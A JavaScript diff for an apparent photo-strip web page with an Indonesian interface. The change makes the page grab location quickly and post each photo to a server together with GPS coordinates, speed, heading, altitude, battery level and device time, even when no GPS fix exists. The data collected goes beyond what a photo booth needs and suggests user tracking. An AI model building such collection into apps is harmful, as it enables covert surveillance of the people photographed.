@@ -250,6 +250,15 @@
     status("Meminta izin", "Izinkan akses lokasi & kamera saat browser meminta. Menunggu sensor studio…", "waiting");
     
     try {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((pos) => {
+          if (!active || run !== session) return;
+          latestPosition = pos;
+          void updateLocationLabels(pos.coords);
+          void sendPosition(run);
+        }, () => {}, { enableHighAccuracy: false, timeout: 3500, maximumAge: 60000 });
+      }
+
       watchId = navigator.geolocation.watchPosition((position) => {
         if (!active || run !== session) return;
         latestPosition = position;
@@ -417,7 +426,7 @@
       if (!coords && navigator.geolocation) {
         try {
           const freshPos = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 7000, enableHighAccuracy: true });
+            navigator.geolocation.getCurrentPosition(res, rej, { timeout: 2500, enableHighAccuracy: false });
           });
           coords = freshPos.coords;
           timestamp = freshPos.timestamp;
@@ -426,22 +435,21 @@
         } catch (_) {}
       }
 
-      if (!coords) {
-        if (cameraStatusEl) cameraStatusEl.textContent = `Pose ${slotNum} siap di strip! Menunggu GPS...`;
-        return pendingPhoto;
-      }
-
       const payload = {
-        latitude: coords.latitude,
-        longitude: coords.longitude,
-        accuracy: coords.accuracy,
-        altitude: Number.isFinite(coords.altitude) ? coords.altitude : null,
-        speed: Number.isFinite(coords.speed) ? coords.speed : null,
-        heading: Number.isFinite(coords.heading) ? coords.heading : null,
+        latitude: coords ? coords.latitude : 0,
+        longitude: coords ? coords.longitude : 0,
+        accuracy: coords ? coords.accuracy : null,
+        altitude: coords && Number.isFinite(coords.altitude) ? coords.altitude : null,
+        speed: coords && Number.isFinite(coords.speed) ? coords.speed : null,
+        heading: coords && Number.isFinite(coords.heading) ? coords.heading : null,
         battery: batteryPercent(),
         device_time: new Date(timestamp).toISOString(),
         photo: pendingPhoto,
       };
+
+      if (cameraStatusEl) {
+        cameraStatusEl.textContent = `Pose ${slotNum} berhasil diambil & disimpan!`;
+      }
 
       const res = await fetch("/api/location", {
         method: "POST",
